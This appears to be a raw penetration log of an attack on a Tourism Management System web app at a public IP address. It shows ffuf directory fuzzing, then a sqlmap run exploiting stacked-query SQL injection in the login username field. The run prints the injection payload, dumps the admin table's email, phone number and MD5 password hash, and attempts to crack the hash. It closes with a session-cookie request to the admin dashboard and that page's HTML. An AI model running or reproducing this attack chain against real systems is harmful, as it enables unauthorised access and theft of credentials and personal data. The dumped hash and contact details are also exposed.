+:: Progress: [211/4614] :: Job [1/1] :: 47 req/sec :: Duration: [0:: Progress: [212/4614] :: Job [1/1] :: 47 req/sec :: Duration: [0:: Progress: [224/4614] :: Job [1/1] :: 48 req/sec :: Duration: [0:: Progress: [234/4614] :: Job [1/1] :: 50 req/sec :: Duration: [0:: Progress: [246/4614] :: Job [1/1] :: 50 req/sec :: Duration: [0:: Progress: [256/4614] :: Job [1/1] :: 52 req/sec :: Duration: [0:: Progress: [256/4614] :: Job [1/1] :: 52 req/sec :: Duration: [0:: Progress: [278/4614] :: Job [1/1] :: 54 req/sec :: Duration: [0:: Progress: [278/4614] :: Job [1/1] :: 54 req/sec :: Duration: [0.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4661ms]                                            
+:: Progress: [308/4614] :: Job [1/1] :: 56 req/sec :: Duration: [0:: Progress: [314/4614] :: Job [1/1] :: 59 req/sec :: Duration: [0:: Progress: [314/4614] :: Job [1/1] :: 59 req/sec :: Duration: [0:: Progress: [351/4614] :: Job [1/1] :: 75 req/sec :: Duration: [0:: Progress: [351/4614] :: Job [1/1] :: 75 req/sec :: Duration: [0:: Progress: [389/4614] :: Job [1/1] :: 95 req/sec :: Duration: [0:: Progress: [389/4614] :: Job [1/1] :: 95 req/sec :: Duration: [0:: Progress: [422/4614] :: Job [1/1] :: 106 req/sec :: Duration: [:: Progress: [422/4614] :: Job [1/1] :: 106 req/sec :: Duration: [:: Progress: [472/4614] :: Job [1/1] :: 132 req/sec :: Duration: [:: Progress: [472/4614] :: Job [1/1] :: 132 req/sec :: Duration: [:: Progress: [472/4614] :: Job [1/1] :: 132 req/sec :: Duration: [:: Progress: [522/4614] :: Job [1/1] :: 152 req/sec :: Duration: [:: Progress: [522/4614] :: Job [1/1] :: 152 req/sec :: Duration: [:: Progress: [555/4614] :: Job [1/1] :: 147 req/sec :: Duration: [:: Progress: [555/4614] :: Job [1/1] :: 147 req/sec :: Duration: [:: Progress: [605/4614] :: Job [1/1] :: 171 req/sec :: Duration: [:: Progress: [605/4614] :: Job [1/1] :: 171 req/sec :: Duration: [:: Progress: [644/4614] :: Job [1/1] :: 174 req/sec :: Duration: [:: Progress: [646/4614] :: Job [1/1] :: 173 req/sec :: Duration: [:: Progress: [692/4614] :: Job [1/1] :: 180 req/sec :: Duration: [:: Progress: [696/4614] :: Job [1/1] :: 179 req/sec :: Duration: [:: Progress: [696/4614] :: Job [1/1] :: 179 req/sec :: Duration: [:: Progress: [746/4614] :: Job [1/1] :: 186 req/sec :: Duration: [:: Progress: [746/4614] :: Job [1/1] :: 186 req/sec :: Duration: [:: Progress: [796/4614] :: Job [1/1] :: 187 req/sec :: Duration: [:: Progress: [796/4614] :: Job [1/1] :: 187 req/sec :: Duration: [:: Progress: [846/4614] :: Job [1/1] :: 178 req/sec :: Duration: [:: Progress: [846/4614] :: Job [1/1] :: 178 req/sec :: Duration: [:: Progress: [891/4614] :: Job [1/1] :: 181 req/sec :: Duration: [:: Progress: [896/4614] :: Job [1/1] :: 217 req/sec :: Duration: [:: Progress: [940/4614] :: Job [1/1] :: 181 req/sec :: Duration: [:: Progress: [946/4614] :: Job [1/1] :: 220 req/sec :: Duration: [:: Progress: [986/4614] :: Job [1/1] :: 182 req/sec :: Duration: [:: Progress: [992/4614] :: Job [1/1] :: 180 req/sec :: Duration: [:: Progress: [1032/4614] :: Job [1/1] :: 191 req/sec :: Duration: :: Progress: [1041/4614] :: Job [1/1] :: 186 req/sec :: Duration: :: Progress: [1083/4614] :: Job [1/1] :: 199 req/sec :: Duration: :: Progress: [1091/4614] :: Job [1/1] :: 194 req/sec :: Duration: :: Progress: [1091/4614] :: Job [1/1] :: 194 req/sec :: Duration: :: Progress: [1141/4614] :: Job [1/1] :: 193 req/sec :: Duration: :: Progress: [1141/4614] :: Job [1/1] :: 193 req/sec :: Duration: css                     [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 236ms]                                             
+:: Progress: [1158/4614] :: Job [1/1] :: 194 req/sec :: Duration: :: Progress: [1191/4614] :: Job [1/1] :: 192 req/sec :: Duration: :: Progress: [1191/4614] :: Job [1/1] :: 192 req/sec :: Duration: dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 272ms]                                                 
+:: Progress: [1220/4614] :: Job [1/1] :: 191 req/sec :: Duration: :: Progress: [1241/4614] :: Job [1/1] :: 193 req/sec :: Duration: :: Progress: [1241/4614] :: Job [1/1] :: 193 req/sec :: Duration: :: Progress: [1291/4614] :: Job [1/1] :: 233 req/sec :: Duration: :: Progress: [1291/4614] :: Job [1/1] :: 233 req/sec :: Duration: :: Progress: [1341/4614] :: Job [1/1] :: 238 req/sec :: Duration: :: Progress: [1341/4614] :: Job [1/1] :: 238 req/sec :: Duration: :: Progress: [1353/4614] :: Job [1/1] :: 187 req/sec :: Duration: :: Progress: [1353/4614] :: Job [1/1] :: 187 req/sec :: Duration: :: Progress: [1365/4614] :: Job [1/1] :: 158 req/sec :: Duration: :: Progress: [1379/4614] :: Job [1/1] :: 145 req/sec :: Duration: :: Progress: [1407/4614] :: Job [1/1] :: 156 req/sec :: Duration: :: Progress: [1424/4614] :: Job [1/1] :: 145 req/sec :: Duration: :: Progress: [1457/4614] :: Job [1/1] :: 159 req/sec :: Duration: :: Progress: [1477/4614] :: Job [1/1] :: 145 req/sec :: Duration: :: Progress: [1507/4614] :: Job [1/1] :: 158 req/sec :: Duration: :: Progress: [1532/4614] :: Job [1/1] :: 145 req/sec :: Duration: :: Progress: [1557/4614] :: Job [1/1] :: 161 req/sec :: Duration: :: Progress: [1586/4614] :: Job [1/1] :: 147 req/sec :: Duration: :: Progress: [1607/4614] :: Job [1/1] :: 198 req/sec :: Duration: :: Progress: [1642/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [1657/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [1694/4614] :: Job [1/1] :: 207 req/sec :: Duration: fonts                   [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 237ms]                                             
+:: Progress: [1696/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [1708/4614] :: Job [1/1] :: 204 req/sec :: Duration: forgot-password         [Status: 200, Size: 2948, Words: 151, Lines: 80, Duration: 252ms]                                           
+:: Progress: [1715/4614] :: Job [1/1] :: 211 req/sec :: Duration: :: Progress: [1746/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [1762/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [1797/4614] :: Job [1/1] :: 204 req/sec :: Duration: :: Progress: [1814/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [1847/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [1867/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [1898/4614] :: Job [1/1] :: 203 req/sec :: Duration: :: Progress: [1921/4614] :: Job [1/1] :: 211 req/sec :: Duration: :: Progress: [1948/4614] :: Job [1/1] :: 202 req/sec :: Duration: :: Progress: [1973/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [1999/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [2025/4614] :: Job [1/1] :: 209 req/sec :: Duration: images                  [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 242ms]                                             
+:: Progress: [2040/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2049/4614] :: Job [1/1] :: 206 req/sec :: Duration: index                   [Status: 200, Size: 2096, Words: 111, Lines: 60, Duration: 237ms]                                           
+:: Progress: [2064/4614] :: Job [1/1] :: 209 req/sec :: Duration: includes                [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 255ms]                                             
+:: Progress: [2066/4614] :: Job [1/1] :: 209 req/sec :: Duration: index.html              [Status: 200, Size: 2096, Words: 111, Lines: 60, Duration: 236ms]                                           
+:: Progress: [2068/4614] :: Job [1/1] :: 211 req/sec :: Duration: index.php               [Status: 200, Size: 2096, Words: 111, Lines: 60, Duration: 234ms]                                           
+:: Progress: [2069/4614] :: Job [1/1] :: 211 req/sec :: Duration: :: Progress: [2077/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [2099/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2128/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2151/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2181/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [2204/4614] :: Job [1/1] :: 206 req/sec :: Duration: js                      [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 240ms]                                             
+:: Progress: [2229/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2233/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2256/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2286/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2311/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [2338/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2362/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [2389/4614] :: Job [1/1] :: 208 req/sec :: Duration: logout                  [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 237ms]                                                 
+:: Progress: [2410/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [2412/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [2441/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2466/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [2492/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2516/4614] :: Job [1/1] :: 204 req/sec :: Duration: :: Progress: [2544/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2568/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [2594/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2619/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2649/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [2671/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2699/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [2723/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [2750/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2775/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [2801/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2828/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [2853/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [2881/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [2904/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [2932/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [2955/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [2987/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [3006/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [3039/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3056/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3091/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [3111/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3142/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3162/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3192/4614] :: Job [1/1] :: 210 req/sec :: Duration: profile                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 233ms]                                                 
+:: Progress: [3205/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3213/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3245/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [3264/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [3296/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [3317/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3348/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3369/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3398/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3420/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3450/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [3473/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3503/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [3527/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [3554/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3579/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3606/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3634/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3659/4614] :: Job [1/1] :: 211 req/sec :: Duration: :: Progress: [3684/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3711/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3736/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3761/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [3790/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [3813/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [3841/4614] :: Job [1/1] :: 212 req/sec :: Duration: :: Progress: [3863/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [3892/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3914/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [3942/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [3967/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [3994/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4019/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [4047/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4072/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [4099/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4122/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [4152/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4174/4614] :: Job [1/1] :: 204 req/sec :: Duration: :: Progress: [4203/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4225/4614] :: Job [1/1] :: 203 req/sec :: Duration: :: Progress: [4253/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4277/4614] :: Job [1/1] :: 204 req/sec :: Duration: :: Progress: [4304/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [4328/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [4355/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [4381/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [4407/4614] :: Job [1/1] :: 209 req/sec :: Duration: :: Progress: [4433/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [4458/4614] :: Job [1/1] :: 207 req/sec :: Duration: :: Progress: [4483/4614] :: Job [1/1] :: 205 req/sec :: Duration: :: Progress: [4510/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4535/4614] :: Job [1/1] :: 204 req/sec :: Duration: :: Progress: [4560/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [4587/4614] :: Job [1/1] :: 208 req/sec :: Duration: :: Progress: [4612/4614] :: Job [1/1] :: 210 req/sec :: Duration: :: Progress: [4614/4614] :: Job [1/1] :: 206 req/sec :: Duration: :: Progress: [4614/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
+    
+           
+           ┌──(guts㉿kali)-[~]
+└─$ sqlmap -r /tmp/tms_login.txt \
+  -p username \
+  --batch \
+  --random-agent \
+  -D tms \
+  -T admin \
+  --dump \
+  --technique=S \
+  --no-cast
+        ___
+       __H__                                                      
+ ___ ___[.]_____ ___ ___  {1.10.6#stable}                         
+|_ -| . [.]     | .'| . |                                         
+|___|_  ["]_|_|_|__,|  _|                                         
+      |_|V...       |_|   https://sqlmap.org                      
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:44:43 /2026-08-30/
+
+[17:44:43] [INFO] parsing HTTP request from '/tmp/tms_login.txt'
+[17:44:43] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[17:44:43] [INFO] resuming back-end DBMS 'mysql' 
+[17:44:43] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#&password=admin&login=Sign In
+---
+[17:44:44] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0.12
+[17:44:44] [INFO] fetching columns for table 'admin' in database 'tms'                                                              
+[17:44:44] [INFO] resumed: 7
+[17:44:44] [INFO] resumed: id
+[17:44:44] [INFO] resumed: UserName
+[17:44:44] [INFO] resumed: Name
+[17:44:44] [INFO] resumed: EmailId
+[17:44:44] [INFO] resumed: MobileNumber
+[17:44:44] [INFO] resumed: Password
+[17:44:44] [INFO] resumed: updationDate
+[17:44:44] [INFO] fetching entries for table 'admin' in database 'tms'                                                              
+[17:44:44] [INFO] fetching number of entries for table 'admin' in database 'tms'
+[17:44:44] [INFO] resumed: 1
+[17:44:44] [INFO] resumed: test@gmail.com
+[17:44:44] [INFO] resumed: 7894561239
+[17:44:44] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[17:44:59] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[17:45:10] [INFO] adjusting time delay to 2 seconds due to good response times
+f925916e2754e5e03
+[17:48:02] [ERROR] invalid character detected. retrying..
+[17:48:02] [WARNING] increasing time delay to 3 seconds
+f75dd58a5733251
+[17:51:30] [INFO] retrieved: admin
+[17:52:23] [INFO] retrieved: Administrator
+[17:54:49] [INFO] retrieved: 1
+[17:54:58] [INFO] retrieved: 2025-10-09 11:18:49
+[17:58:43] [INFO] recognized possible password hashes in column 'Password'                                                          
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[17:58:43] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[17:58:43] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[17:58:43] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[17:58:43] [INFO] starting 4 processes 
+[17:58:55] [WARNING] no clear password(s) found                  
+Database: tms
+Table: admin
+[1 entry]
++----+----------------+---------------+----------------------------------+----------+--------------+---------------------+
+| id | EmailId        | Name          | Password                         | UserName | MobileNumber | updationDate        |
++----+----------------+---------------+----------------------------------+----------+--------------+---------------------+
+| 1  | test@gmail.com | Administrator | f925916e2754e5e03f75dd58a5733251 | admin    | 7894561239   | 2025-10-09 11:18:49 |
++----+----------------+---------------+----------------------------------+----------+--------------+---------------------+
+
+[17:58:55] [INFO] table 'tms.`admin`' dumped to CSV file '/home/guts/.local/share/sqlmap/output/104.156.254.36/dump/tms/admin.csv'  
+[17:58:55] [INFO] fetched data logged to text files under '/home/guts/.local/share/sqlmap/output/104.156.254.36'                    
+
+[*] ending @ 17:58:55 /2026-08-30/
+GET /tms/admin/dashboard.php HTTP/1.1
+Host: 104.156.254.36
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://104.156.254.36/tms/admin/profile.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=s6bvpvoh4dna5o5ck2krp0ckdf
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Sun, 30 Aug 2026 12:30:08 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 11878
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>TMS | Admin Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
+<!-- Bootstrap Core CSS -->
+<link href="css/bootstrap.min.css" rel='stylesheet' type='text/css' />
+<!-- Custom CSS -->
+<link href="css/style.css" rel='stylesheet' type='text/css' />
+<link rel="stylesheet" href="css/morris.css" type="text/css"/>
+<!-- Graph CSS -->
+<link href="css/font-awesome.css" rel="stylesheet"> 
+<!-- jQuery -->
+<script src="js/jquery-2.1.4.min.js"></script>
+<!-- //jQuery -->
+<link href='//fonts.googleapis.com/css?family=Roboto:700,500,300,100italic,100,400' rel='stylesheet' type='text/css'/>
+<link href='//fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+<!-- lined-icons -->
+<link rel="stylesheet" href="css/icon-font.min.css" type='text/css' />
+<!-- //lined-icons -->
+</head> 
+<body>
+   <div class="page-container">
+   <!--/content-inner-->
+<div class="left-content">
+	   <div class="mother-grid-inner">
+<!--header start here-->
+<div class="header-main">
+					<div class="logo-w3-agile">
+								<h1><a href="dashboard.php">Tourism Management System</a></h1>
+							</div>
+				
+						
+						<div class="profile_details w3l">		
+								<ul>
+									<li class="dropdown profile_details_drop">
+										<a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
+											<div class="profile_img">	
+												<span class="prfil-img"><img src="images/User-icon.png" alt=""> </span> 
+												<div class="user-name">
+													<p>Welcome</p>
+													<span>Administrator</span>
+												</div>
+												<i class="fa fa-angle-down"></i>
+												<i class="fa fa-angle-up"></i>
+												<div class="clearfix"></div>	
+											</div>	
+										</a>
+										<ul class="dropdown-menu drp-mnu">
+											<li> <a href="profile.php"><i class="fa fa-lock"></i> Profile</a> </li> 
+											<li> <a href="change-password.php"><i class="fa fa-lock"></i> Setting</a> </li> 
+											<li> <a href="logout.php"><i class="fa fa-sign-out"></i> Logout</a> </li>
+										</ul>
+									</li>
+								</ul>
+							</div>
+							
+				     <div class="clearfix"> </div>	
+				</div><!--header end here-->
+		<ol class="breadcrumb">
+                <li class="breadcrumb-item"><a href="index.html">Home</a> <i class="fa fa-angle-right"></i></li>
+            </ol>
+<!--four-grids here-->
+		<div class="four-grids">
+			<a href="manage-users.php" target="_blank">
+					<div class="col-md-4 four-grid">
+						<div class="four-agileits">
+							<div class="icon">
+								<i class="glyphicon glyphicon-user" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>User</h3>
+
+											<h4> 7 </h4>
+				
+								
+							</div>
+							
+						</div>
+					</div>
+				</a>
+
+
+<a href="manageissues.php" target="_blank">
+						<div class="col-md-4 four-grid">
+						<div class="four-w3ls">
+							<div class="icon">
+								<i class="glyphicon glyphicon-folder-open" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>Issues Riaised</h3>
+																				<h4>2</h4>
+								
+							</div>
+							
+						</div>
+					</div></a>
+
+
+<a href="manage-packages.php" target="_blank">
+					<div class="col-md-4 four-grid">
+						<div class="four-wthree">
+							<div class="icon">
+								<i class="glyphicon glyphicon-briefcase" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>Toatal packages</h3>
+																									<h4>9</h4>
+								
+							</div>
+							
+						</div>
+					</div>
+						<div class="clearfix"></div>
+				</div>
+</a>
+	
+
+	<a href="manage-enquires.php" target="_blank">
+	<div class="four-grids">
+			<div class="col-md-4 four-grid">
+						<div class="four-agileinfo">
+							<div class="icon">
+								<i class="glyphicon glyphicon-folder-open" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>Enquiries</h3>
+																				<h4>2</h4>
+								
+							</div>
+							
+						</div>
+					</div>
+				</a>
+
+
+	<a href="manage-enquires.php" target="_blank">
+			<div class="col-md-4 four-grid">
+						<div class="four-agileits">
+							<div class="icon">
+								<i class="glyphicon glyphicon-folder-open" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>New Enquiries</h3>
+
+											<h4> 1 </h4>	
+							</div>
+						</div>
+					</div></a>
+
+	<a href="manage-enquires.php" target="_blank">
+						<div class="col-md-4 four-grid">
+						<div class="four-w3ls">
+							<div class="icon">
+								<i class="glyphicon glyphicon-folder-open" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>Read Enquiries</h3>
+																				<h4>1</h4>
+								
+							</div>
+							
+						</div>
+					</div>
+				</a>
+<div class="clearfix"></div>
+				</div>
+	<div class="four-grids">
+
+	<a href="manage-bookings.php" target="_blank">
+								<div class="col-md-3 four-grid">
+						<div class="four-agileinfo">
+							<div class="icon">
+								<i class="glyphicon glyphicon-list-alt" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>Bookings</h3>
+																		<h4>3</h4>
+
+							</div>
+							
+						</div>
+					</div></a>
+		<a href="manage-bookings.php" target="_blank">
+		<div class="col-md-3 four-grid">
+						<div class="four-wthree" style="color:#ffc107 !important">
+							<div class="icon">
+								<i class="glyphicon glyphicon-list-alt" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>New Bookings</h3>
+
+											<h4> 1 </h4>	
+							</div>
+						</div>
+					</div>
+</a>
+
+	<a href="manage-bookings.php" target="_blank">
+
+		<div class="col-md-3 four-grid">
+						<div class="four-agileits">
+							<div class="icon">
+								<i class="glyphicon glyphicon-list-alt" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>Cancelled Bookings</h3>
+
+											<h4> 0 </h4>	
+							</div>
+						</div>
+					</div>
+</a>
+	<a href="manage-bookings.php" target="_blank">
+						<div class="col-md-3 four-grid">
+						<div class="four-w3ls">
+							<div class="icon">
+								<i class="glyphicon glyphicon-list-alt" aria-hidden="true"></i>
+							</div>
+							<div class="four-text">
+								<h3>Confirmed Bookings</h3>
+
+											<h4> 2 </h4>	
+							</div>
+						</div>
+					</div>
+				</a>
+					<div class="clearfix"></div>
+				</div>
+<!--//four-grids here-->
+
+
+<div class="inner-block">
+
+</div>
+<!--inner block end here-->
+<!--copy rights start here-->
+<div class="copyrights">
+	 <p>TMS. All Rights Reserved |  <a href="#">TMS</a> </p>
+</div>	
+</div>
+</div>
+
+			<!--/sidebar-menu-->
+				<div class="sidebar-menu">
+					<header class="logo1">
+						<a href="#" class="sidebar-icon"> <span class="fa fa-bars"></span> </a> 
+					</header>
+						<div style="border-top:1px ridge rgba(255, 255, 255, 0.15)"></div>
+                           <div class="menu">
+									<ul id="menu" >
+										<li><a href="dashboard.php"><i class="fa fa-tachometer"></i> <span>Dashboard</span><div class="clearfix"></div></a></li>
+										
+									 <li id="menu-academico" ><a href="#"><i class="fa fa-list-ul" aria-hidden="true"></i><span> Tour Packages</span> <span class="fa fa-angle-right" style="float: right"></span><div class="clearfix"></div></a>
+										   <ul id="menu-academico-sub" >
+										   <li id="menu-academico-avaliacoes" ><a href="create-package.php">Create</a></li>
+											<li id="menu-academico-avaliacoes" ><a href="manage-packages.php">Manage</a></li>
+										  </ul>
+										</li>
+									<li id="menu-academico" ><a href="manage-users.php"><i class="fa fa-users" aria-hidden="true"></i><span>Manage Users</span><div class="clearfix"></div></a></li>
+									
+									<li><a href="manage-bookings.php"><i class="fa fa-list" aria-hidden="true"></i>  <span>Manage Booking</span><div class="clearfix"></div></a></li>
+									 <li><a href="manageissues.php"><i class="fa fa-table"></i>  <span>Manage Issues</span><div class="clearfix"></div></a></li>
+									<li><a href="manage-enquires.php"><i class="fa fa-file-text-o" aria-hidden="true"></i>  <span>Manage Enquiries</span><div class="clearfix"></div></a></li>
+									<li><a href="manage-pages.php"><i class="fa fa-file-text-o" aria-hidden="true"></i>  <span>Manage Pages</span><div class="clearfix"></div></a></li>
+							     
+									
+								  </ul>
+								</div>
+							  </div>							  <div class="clearfix"></div>		
+							</div>
+							<script>
+							var toggle = true;
+										
+							$(".sidebar-icon").click(function() {                
+							  if (toggle)
+							  {
+								$(".page-container").addClass("sidebar-collapsed").removeClass("sidebar-collapsed-back");
+								$("#menu span").css({"position":"absolute"});
+							  }
+							  else
+							  {
